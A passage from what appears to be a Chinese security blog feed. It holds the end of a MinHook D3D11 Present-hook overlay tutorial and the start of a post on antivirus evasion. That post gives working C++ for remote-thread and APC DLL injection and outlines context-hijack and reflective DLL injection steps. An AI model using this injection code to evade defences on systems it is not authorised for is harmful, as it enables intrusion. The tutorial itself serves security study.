<span class="comment">//释放</span></span><br><span class="line">        old_present = (DIGX_Present)p_vtable[<span class="number">8</span>];    <span class="comment">//从虚函数表得到present函数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>确定下主线程的主要结构</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//&quot;main&quot; loop</span></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">main</span><span class="params">(HMODULE hModule)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.获得函数</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">getPresentPtr</span>())</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2.开始hook</span></span><br><span class="line">    <span class="comment">//  2.1 hook初始化</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">MH_Initialize</span>() != MH_OK)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//  2.2 创建hook</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">MH_CreateHook</span>(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span>**&gt;(old_present), &amp;myPresent, <span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span>**&gt;(&amp;originPresent)) != MH_OK)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//  2.3 启用hook</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">MH_EnableHook</span>(old_present) != MH_OK)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 3.等待 F1 退出</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">GetAsyncKeyState</span>(VK_F1)) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4.退出hook，清理</span></span><br><span class="line">        <span class="comment">//Cleanup</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">MH_DisableHook</span>(MH_ALL_HOOKS) != MH_OK)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">MH_Uninitialize</span>() != MH_OK)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">FreeLibraryAndExitThread</span>(hModule, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH: &#123;</span><br><span class="line">        <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)main, hModule, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>完成<code>myPresent</code>来替换旧的<code>Present</code>，这里依旧是抄了写imgui的示例代码，主要还是参考示例代码中的初始化和绘制的步骤</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">WNDPROC oWndProc;</span><br><span class="line"><span class="comment">// Forward declare message handler from imgui_impl_win32.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> IMGUI_IMPL_API LRESULT <span class="title">ImGui_ImplWin32_WndProcHandler</span><span class="params">(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Win32 message handler</span></span><br><span class="line"><span class="comment">// You can read the io.WantCaptureMouse, io.WantCaptureKeyboard flags to tell if dear imgui wants to use your inputs.</span></span><br><span class="line"><span class="comment">// - When io.WantCaptureMouse is true, do not dispatch mouse input data to your main application, or clear/overwrite your copy of the mouse data.</span></span><br><span class="line"><span class="comment">// - When io.WantCaptureKeyboard is true, do not dispatch keyboard input data to your main application, or clear/overwrite your copy of the keyboard data.</span></span><br><span class="line"><span class="comment">// Generally you may always pass all inputs to dear imgui, and hide them from your application based on those two flags.</span></span><br><span class="line"><span class="function">LRESULT WINAPI <span class="title">WndProc</span><span class="params">(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ImGui_ImplWin32_WndProcHandler</span>(hWnd, msg, wParam, lParam))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ::<span class="built_in">DefWindowProcW</span>(hWnd, msg, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> init = <span class="literal">false</span>;</span><br><span class="line">HWND window = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> ID3D11Device* g_pd3dDevice = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="type">static</span> ID3D11DeviceContext* g_pd3dDeviceContext = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="type">static</span> ID3D11RenderTargetView* g_mainRenderTargetView = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">long</span> __stdcall <span class="title">myPresent</span><span class="params">(IDXGISwapChain* p_swap_chain, UINT sync_interval, UINT flags)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!init) &#123;</span><br><span class="line">        <span class="comment">//从swap chain获得device</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">SUCCEEDED</span>(p_swap_chain-&gt;<span class="built_in">GetDevice</span>(__uuidof(ID3D11Device), (<span class="type">void</span>**)&amp;g_pd3dDevice)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//获得上下文</span></span><br><span class="line">            g_pd3dDevice-&gt;<span class="built_in">GetImmediateContext</span>(&amp;g_pd3dDeviceContext);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            DXGI_SWAP_CHAIN_DESC sd;</span><br><span class="line">            p_swap_chain-&gt;<span class="built_in">GetDesc</span>(&amp;sd);</span><br><span class="line">            window = sd.OutputWindow;</span><br><span class="line">            ID3D11Texture2D* pBackBuffer;</span><br><span class="line">            p_swap_chain-&gt;<span class="built_in">GetBuffer</span>(<span class="number">0</span>, __uuidof(ID3D11Texture2D), (LPVOID*)&amp;pBackBuffer);</span><br><span class="line">            g_pd3dDevice-&gt;<span class="built_in">CreateRenderTargetView</span>(pBackBuffer, <span class="literal">NULL</span>, &amp;g_mainRenderTargetView);</span><br><span class="line">            pBackBuffer-&gt;<span class="built_in">Release</span>();</span><br><span class="line"></span><br><span class="line">            oWndProc = (WNDPROC)<span class="built_in">SetWindowLongPtr</span>(window, GWLP_WNDPROC, (LONG_PTR)WndProc);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//创建imgui上下文</span></span><br><span class="line">            ImGui::<span class="built_in">CreateContext</span>();</span><br><span class="line">            ImGuiIO&amp; io = ImGui::<span class="built_in">GetIO</span>(); (<span class="type">void</span>)io;</span><br><span class="line">            io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;     <span class="comment">// Enable Keyboard Controls</span></span><br><span class="line">            io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;      <span class="comment">// Enable Gamepad Controls</span></span><br><span class="line"></span><br><span class="line">            ImGui::<span class="built_in">StyleColorsDark</span>();</span><br><span class="line"></span><br><span class="line">            ImGuiStyle&amp; style = ImGui::<span class="built_in">GetStyle</span>();</span><br><span class="line">            <span class="keyword">if</span> (io.ConfigFlags)</span><br><span class="line">            &#123;</span><br><span class="line">                style.WindowRounding = <span class="number">0.0f</span>;</span><br><span class="line">                style.Colors[ImGuiCol_WindowBg].w = <span class="number">1.0f</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">ImGui_ImplWin32_Init</span>(window);</span><br><span class="line">            <span class="built_in">ImGui_ImplDX11_Init</span>(g_pd3dDevice, g_pd3dDeviceContext);</span><br><span class="line">            init = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">originPresent</span>(p_swap_chain, sync_interval, flags);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ImGui_ImplDX11_NewFrame</span>();</span><br><span class="line">    <span class="built_in">ImGui_ImplWin32_NewFrame</span>();</span><br><span class="line"></span><br><span class="line">    ImGui::<span class="built_in">NewFrame</span>();</span><br><span class="line"></span><br><span class="line">    ImGui::<span class="built_in">ShowDemoWindow</span>();</span><br><span class="line"></span><br><span class="line">    ImGui::<span class="built_in">EndFrame</span>();</span><br><span class="line">    ImGui::<span class="built_in">Render</span>();</span><br><span class="line">    g_pd3dDeviceContext-&gt;<span class="built_in">OMSetRenderTargets</span>(<span class="number">1</span>, &amp;g_mainRenderTargetView, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">ImGui_ImplDX11_RenderDrawData</span>(ImGui::<span class="built_in">GetDrawData</span>());</span><br><span class="line">    <span class="comment">// Update and Render additional Platform Windows</span></span><br><span class="line">    <span class="comment">//if (io.ConfigFlags &amp; ImGuiConfigFlags_ViewportsEnable)</span></span><br><span class="line">    <span class="comment">//&#123;</span></span><br><span class="line">    <span class="comment">//    ImGui::UpdatePlatformWindows();</span></span><br><span class="line">    <span class="comment">//    ImGui::RenderPlatformWindowsDefault();</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// Present</span></span><br><span class="line">    <span class="comment">//HRESULT hr = g_pSwapChain-&gt;Present(1, 0);   // Present with vsync</span></span><br><span class="line">    <span class="comment">////HRESULT hr = g_pSwapChain-&gt;Present(0, 0); // Present without vsync</span></span><br><span class="line">    <span class="comment">//g_SwapChainOccluded = (hr == DXGI_STATUS_OCCLUDED);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">originPresent</span>(p_swap_chain, sync_interval, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f950e1c8830aacf20c596032f21d2345.png" alt="image-20240917134455215" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习是对技术的祛魅&lt;/p&gt;
&lt;p&gt;公众号：&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="source" scheme="https://joe1sn.eu.org/tags/source/"/>
    
    <category term="MinHook" scheme="https://joe1sn.eu.org/tags/MinHook/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】常见的DLL和Shellcode注入方式</title>
    <link href="https://joe1sn.eu.org/2024/10/01/dll-inject/"/>
    <id>https://joe1sn.eu.org/2024/10/01/dll-inject/</id>
    <published>2024-10-01T06:50:28.000Z</published>
    <updated>2025-02-27T06:50:41.055Z</updated>
    
    <content type="html"><![CDATA[<p>公众号：<a href="https://mp.weixin.qq.com/s/qYO0Cf5MRT4vKCT5WYz1KQ">https://mp.weixin.qq.com/s/qYO0Cf5MRT4vKCT5WYz1KQ</a></p><span id="more"></span><p>或许我们的公众号会有更多你感兴趣的内容</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p><h1 id="免杀常见的dll和shellcode注入方式"><a class="markdownIt-Anchor" href="#免杀常见的dll和shellcode注入方式"></a> 【免杀】常见的DLL和Shellcode注入方式</h1><p>这里的dll和shellcode注入指的是动态的注入，及进程运行时的注入</p><p>关于代码可以从github仓库找到：<a href="https://github.com/Joe1sn/S-inject">https://github.com/Joe1sn/S-inject</a></p><h1 id="a-dll注入"><a class="markdownIt-Anchor" href="#a-dll注入"></a> A. DLL注入</h1><p>首先回顾一下一个程序是如何加载dll的，使用的是<code>kernel32.dll</code>的<code>LoadLibraryA</code>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HMODULE <span class="title">LoadLibraryA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] LPCSTR lpLibFileName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><code>lpLibFileName</code>就是dll文件的路径</p><p>由于本篇只是简单的、常见的方法，没有涉及如天堂之门（Heaven’s Gate）等高级技术，需要暂时认为</p><ul><li>64位dll只能使用64位注入器注入64位程序，32位也是如此</li></ul><h2 id="远程线程调用注入"><a class="markdownIt-Anchor" href="#远程线程调用注入"></a> 远程线程调用注入</h2><p>这里用到的是函数<code>createRemoteThread </code>函数，主要作用就是再其他进程创建一个新的线程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE                 hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  SIZE_T                 dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPVOID                 lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  DWORD                  dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] LPDWORD                lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><code>hProcess</code>：远程进程句柄</li><li><code>lpStartAddress</code>：线程执行的应用程序定义函数的指针，表示远程进程中线程的起始地址。 函数必须存在于远程进程中</li><li><code>lpParameter</code>：对应的参数</li></ul><p><strong>那么可以得到思路：</strong></p><ol><li><p>将dll的路径写入远程的进程(待注入的进程)</p></li><li><p>获得远程进程<code>LoadLibraryA</code>函数的地址</p><p>这里有个小小的trick，windows加载核心DLL（如<code>ntdll.dll</code>，<code>kernel32.dll</code>）的时候，相对于内存的位置是固定的，也就是加载到进程的内存是相对固定的，那么我们加载这些dll的内存位置和远程进程的是一样的</p></li><li><p>使用<code>createRemoteThread </code>创建新的进程</p></li></ol><p>可以得到如下代码（为了排版，所有代码都会省略掉无关部分）</p><p><a href="https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L88">https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L88</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*                  Remote Thread Injection                  */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Injector::RemoteThreadInject</span><span class="params">(DWORD pid)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    SIZE_T dwWriteSize = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//1.获得远程进程句柄</span></span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    <span class="comment">//2.在远程进程中创建内存空间，内存RWX</span></span><br><span class="line">    LPVOID pAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="comment">//3.向2中开辟的内存空间写入dll路径</span></span><br><span class="line">    bRet = <span class="built_in">WriteProcessMemory</span>(hProcess, pAddress, <span class="keyword">this</span>-&gt;DllPath.<span class="built_in">c_str</span>(), <span class="keyword">this</span>-&gt;DllPath.<span class="built_in">size</span>() + <span class="number">1</span>, &amp;dwWriteSize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.从ntdll导出 LoadLibraryA 函数</span></span><br><span class="line">    HMODULE Ntdll = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    LPVOID LoadLibraryBase = <span class="built_in">GetProcAddress</span>(Ntdll, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.创建远程进程</span></span><br><span class="line">    HANDLE hRemoteProcess = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)LoadLibraryBase, pAddress, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//6.等待远程线程执行</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hRemoteProcess, <span class="number">500</span>);</span><br><span class="line">    <span class="comment">//7.释放资源</span></span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pAddress, <span class="number">0x300</span>, MEM_COMMIT);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">FreeModule</span>(Ntdll);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/677295bb4d611e870b33459c107eff71.png" alt="image-20240930085635572" /></p><p>那么同样的原理，加载完成DLL后，如何卸载该DLL呢？，可以使用windows提供的函数<code>FreeLibrary</code>，具体原理类似，读者不妨自己实现一下</p><p><a href="https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L156">https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L156</a></p><h2 id="apc注入"><a class="markdownIt-Anchor" href="#apc注入"></a> APC注入</h2><p>这里就是利用<code>KiUserDispatch</code>调度进行APC例程调用，让线程使用<code>LoadLibarary</code>进行注入</p><p>关于Windows APC队列更深入的了解：<a href="https://www.anquanke.com/post/id/247813">https://www.anquanke.com/post/id/247813</a></p><p><a href="https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L304">https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L304</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Injector::ApcInject</span><span class="params">(DWORD pid)</span> </span>&#123;</span><br><span class="line">    SIZE_T dwWriteSize = <span class="number">0</span>;</span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    LPVOID pAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0x300</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    bRet = <span class="built_in">WriteProcessMemory</span>(hProcess, pAddress, <span class="keyword">this</span>-&gt;DllPath.<span class="built_in">c_str</span>(), <span class="keyword">this</span>-&gt;DllPath.<span class="built_in">size</span>() + <span class="number">1</span>, &amp;dwWriteSize);</span><br><span class="line"></span><br><span class="line">    HMODULE Ntdll = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    LPVOID LoadLibraryBase = <span class="built_in">GetProcAddress</span>(Ntdll, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"></span><br><span class="line">    THREADENTRY32 te = &#123; <span class="built_in">sizeof</span>(THREADENTRY32) &#125;;</span><br><span class="line">    HANDLE hThreadSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    BOOL bStat = FALSE;</span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到第一个线程</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Thread32First</span>(hThreadSnap, &amp;te)) &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (te.th32OwnerProcessID == pid) &#123;</span><br><span class="line">                hThread = <span class="built_in">OpenThread</span>(PROCESS_ALL_ACCESS, FALSE, te.th32ThreadID);</span><br><span class="line"><span class="comment">//插入APC队列</span></span><br><span class="line">                DWORD dwRet = <span class="built_in">QueueUserAPC</span>((PAPCFUNC)LoadLibraryBase, hThread, (ULONG_PTR)pAddress);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (dwRet &gt; <span class="number">0</span>)bStat = TRUE;</span><br><span class="line">                <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(hThreadSnap, &amp;te));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pAddress, <span class="number">0x300</span>, MEM_COMMIT);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThreadSnap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个技巧就是使用NTDLL中的未导出函数<code>NtTestAlert</code>就可以立即调用APC例程，这个方法的好处就是绕过了<code>createRemoteThread</code>的API调用，使用了<code>QueueUserAPC</code>进行创建，但是可能会出现APC队列阻塞。也是一个比较入门的免杀手法。</p><h2 id="上下文注入"><a class="markdownIt-Anchor" href="#上下文注入"></a> 上下文注入</h2><p>如果你之前在写PE加载器的话，那么自然而然的就想到这个，主要是通过暂停程序，获得并修改上下文，在内存中写入shellcode，然后再恢复就行了，<strong>这部分为了理解简单会放到shellcode注入中讲解</strong></p><p>用到的主要WINAPI就是</p><ol><li>创建会shellcode裸函数（<code>__declspec(naked)</code>）,导出<code>LoadLibrary</code>等函数</li><li><code>OpenProcess</code>后再<code>OpenThread</code>，使用<code>SuspendThread</code>暂停线程</li><li>创建类型为<code>CONTEXT</code>的变量，初始化<code>context.ContextFlags=CONTEXT_FULL</code></li><li><code>GetThreadContext</code>获得上下文</li><li><code>VirualAlloc</code>获得空间，类似<code>RtlMoveMemory</code>这种复制shellcode到空间</li><li>将<code>context.eip = shellcode_addr</code>，使用<code>SetThreadContext</code>重新设置上下文，<code>ResumeThread</code>恢复线程</li></ol><h2 id="反射dll注入"><a class="markdownIt-Anchor" href="#反射dll注入"></a> 反射DLL注入</h2><p>比较复杂的一种方法，也是注入、免杀成功率比较高的一种方法</p><p>首先需要了解DLL加载过后的格式，我这里随意举个使用d3d11.dll的例子</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/50aa74f90a8c413bac1171f26991f3b2.png" alt="image-20240930091929059" /></p><p>神奇的是加载后的DLL在进程内存和文件中的存储是一致的，我们则可以利用这一特性，仿照<code>loadlibaray</code>进行自己函数的装载，这里结合 <a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a> 讲解</p><p>由于上面的分析可以得到大致步骤</p><ol><li>使用<code>CreatFile</code>读取DLL文件，并将内容加载到远程进程</li><li>找到指定函数的偏移位置（类似于<code>DllMain</code>）</li><li>使用<code>createRemoteThread</code>或者其他方法进行注入</li></ol><p><a 